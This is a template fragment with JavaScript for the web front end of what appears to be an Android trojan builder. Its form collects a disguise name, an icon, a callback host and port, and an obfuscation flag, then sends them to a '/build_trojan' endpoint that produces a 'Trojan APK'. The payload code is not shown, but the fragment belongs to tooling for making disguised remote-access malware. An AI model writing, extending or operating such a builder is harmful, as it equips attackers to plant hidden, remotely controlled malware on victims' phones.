{% block extra_scripts %}
<script>
document.getElementById('trojanForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    
    const buildBtn = document.getElementById('buildBtn');
    const progressSection = document.getElementById('progressSection');
    const resultSection = document.getElementById('resultSection');
    const progressBar = document.getElementById('progressBar');
    const progressText = document.getElementById('progressText');
    
    // Disable form and show progress
    buildBtn.disabled = true;
    buildBtn.innerHTML = '<i class="bi bi-gear-fill"></i> Building...';
    progressSection.style.display = 'block';
    resultSection.style.display = 'none';
    progressText.textContent = 'Initializing...';
    progressBar.style.width = '0%';
    
    try {
        // Handle file upload if present
        let iconPath = 'data/tmp/icon.png';
        const iconFile = document.getElementById('appIcon').files[0];
        
        if (iconFile) {
            progressText.textContent = 'Uploading icon...';
            progressBar.style.width = '20%';
            
            const formData = new FormData();
            formData.append('icon', iconFile);
            
            const uploadResponse = await fetch('/upload_icon', {
                method: 'POST',
                body: formData
            });
            
            if (uploadResponse.ok) {
                const uploadResult = await uploadResponse.json();
                iconPath = uploadResult.path;
            }
        }
        
        // Build trojan
        progressText.textContent = 'Starting build process...';
        progressBar.style.width = '30%';
        
        const data = {
            name: document.getElementById('appName').value || 'trojan',
            host: document.getElementById('hostAddress').value,
            port: document.getElementById('hostPort').value,
            icon: iconPath,
            obfuscate: document.getElementById('obfuscate').checked
        };
        
        const response = await fetch('/build_trojan', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(data)
        });
        
        const result = await response.json();
        
        if (response.ok && result.success && result.task_id) {
            progressText.textContent = 'Build started. Monitoring progress...';
            progressBar.style.width = '50%';
            
            // Redirect to status page for real-time polling
            window.location.href = `/status/${result.task_id}?type=trojan`;
        } else {
            throw new Error(result.error || result.message || 'Build failed');
        }
        
    } catch (error) {
        console.error('Trojan build error:', error);  // Debug log
        progressBar.style.width = '0%';
        resultSection.style.display = 'block';
        document.getElementById('resultCard').className = 'card bg-danger';
        document.getElementById('resultText').textContent = error.message || 'An unexpected error occurred';
        document.getElementById('downloadSection').style.display = 'none';
    } finally {
        // Re-enable form
        buildBtn.disabled = false;
        buildBtn.innerHTML = '<i class="bi bi-bug"></i> Build Trojan APK';
    }
});
</script>
{% endblock %}